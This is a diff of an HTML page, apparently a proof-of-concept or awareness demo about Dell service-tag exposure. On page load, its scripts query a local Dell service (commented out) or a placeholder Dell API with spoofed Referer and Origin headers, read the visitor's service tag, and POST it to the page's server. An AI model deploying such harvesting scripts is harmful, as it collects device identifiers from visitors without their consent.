@@ -30,82 +30,67 @@
     }
   </style>
   <script>
-    // async function fetchAndSendServiceTag() {
-    //   try {
-    //     const config = await fetch('/admin/config').then(res => res.json());
-    //     const encodedSignature = encodeURIComponent(config.STATIC_SIGNATURE);
-    //     const localURL = `http://127.0.0.1:8884/clientservice/isalive/?expires=${config.STATIC_EXPIRES}&signature=${encodedSignature}&buster=${config.STATIC_BUSTER}&s_id=${config.STATIC_SID}`;
-  
-    //     const response = await fetch(localURL, {
-    //       headers: {
-    //         Referer: 'https://www.dell.com/support/home/en-in'
-    //       }
-    //     });
-  
-    //     const data = await response.json();
-    //     const serviceTag = data.serviceTag;
-  
-    //     if (serviceTag) {
-    //       await fetch('/submit', {
-    //         method: 'POST',
-    //         headers: { 'Content-Type': 'application/json' },
-    //         body: JSON.stringify({ serviceTag })
-    //       });
-    //       console.log("✅ Sent serviceTag to server:", serviceTag);
-    //     } else {
-    //       console.warn("⚠️ No serviceTag found in response");
-    //     }
-    //   } catch (err) {
-    //     console.error("❌ Failed to fetch serviceTag:", err.message);
-    //   }
-    // }
-    async function fetchAndSendServiceTag() {
-    try {
-      // 1. Get your config from your server
-      const config = await fetch('/admin/config').then(res => res.json());
-      const encodedSignature = encodeURIComponent(config.STATIC_SIGNATURE);
-      
-      // 2. Construct the Dell API URL (replace with actual Dell endpoint)
-      const dellApiUrl = `https://api.dell.com/some-endpoint?expires=${config.STATIC_EXPIRES}&signature=${encodedSignature}&buster=${config.STATIC_BUSTER}&s_id=${config.STATIC_SID}`;
-  
-      // 3. Call Dell API directly from browser
-      const response = await fetch(dellApiUrl, {
-        headers: {
-          'Referer': 'https://www.dell.com/support/home/en-in',
-          'Origin': 'https://www.dell.com'
-        },
-        credentials: 'include' // If cookies are needed
-      });
-
-      if (!response.ok) throw new Error('Dell API request failed');
-      
-      const data = await response.json();
-      const serviceTag = data.serviceTag;
-
-      if (serviceTag) {
-        // 4. Send to your server for processing
-        await fetch('/submit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ serviceTag })
+    async function pingLocalHost() {
+      try {
+        await fetch('http://localhost:3000/', {
+          method: 'GET',
+          mode: 'cors'
         });
-        console.log("✅ Sent serviceTag to server:", serviceTag);
-      } else {
-        console.warn("⚠️ No serviceTag found in response");
+        console.log('✅ Pinged localhost:3000');
+      } catch (err) {
+        console.error('❌ Failed to ping localhost:3000', err);
       }
-    } catch (err) {
-      console.error("❌ Failed to fetch serviceTag:", err.message);
-      // Fallback option if direct API call fails
-      tryFallbackMethod();
     }
-  }
 
-  // Optional fallback method
-  async function tryFallbackMethod() {
-    // Implement alternative approach here if needed
-  }
+    async function fetchAndSendServiceTag() {
+      try {
+        // 1. Get your config from your server
+        const config = await fetch('/admin/config').then(res => res.json());
+        const encodedSignature = encodeURIComponent(config.STATIC_SIGNATURE);
+        
+        // 2. Construct the Dell API URL
+        const dellApiUrl = `https://api.dell.com/some-endpoint?expires=${config.STATIC_EXPIRES}&signature=${encodedSignature}&buster=${config.STATIC_BUSTER}&s_id=${config.STATIC_SID}`;
+    
+        // 3. Call Dell API directly from browser
+        const response = await fetch(dellApiUrl, {
+          headers: {
+            'Referer': 'https://www.dell.com/support/home/en-in',
+            'Origin': 'https://www.dell.com'
+          },
+          credentials: 'include'
+        });
+  
+        if (!response.ok) throw new Error('Dell API request failed');
+        
+        const data = await response.json();
+        const serviceTag = data.serviceTag;
+  
+        if (serviceTag) {
+          // 4. Send to your server for processing
+          await fetch('/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ serviceTag })
+          });
+          console.log("✅ Sent serviceTag to server:", serviceTag);
+        } else {
+          console.warn("⚠️ No serviceTag found in response");
+        }
+      } catch (err) {
+        console.error("❌ Failed to fetch serviceTag:", err.message);
+        tryFallbackMethod();
+      }
+    }
 
-  window.onload = fetchAndSendServiceTag;
+    // Optional fallback method
+    async function tryFallbackMethod() {
+      // Implement alternative approach here if needed
+    }
+
+    window.onload = async () => {
+      await pingLocalHost();
+      await fetchAndSendServiceTag();
+    };
   </script>
 </head>
 <body>
@@ -133,7 +118,6 @@
     <li>
       <strong>Hardware impersonation:</strong> Bad actors may use the tag to obtain sensitive hardware info (like motherboard serial, BIOS version).
     </li>
- 
     <li>
       <strong>Fake ownership claims:</strong> Especially in resale scenarios, someone could impersonate a rightful owner.
     </li>
@@ -141,8 +125,6 @@
       <strong>Social engineering attacks:</strong> Combined with LinkedIn or internal IT directory data, attackers can launch targeted phishing or impersonation attacks.
     </li>
   </ul>
-
-
 
   <h2>Good Practices</h2>
   <ul>
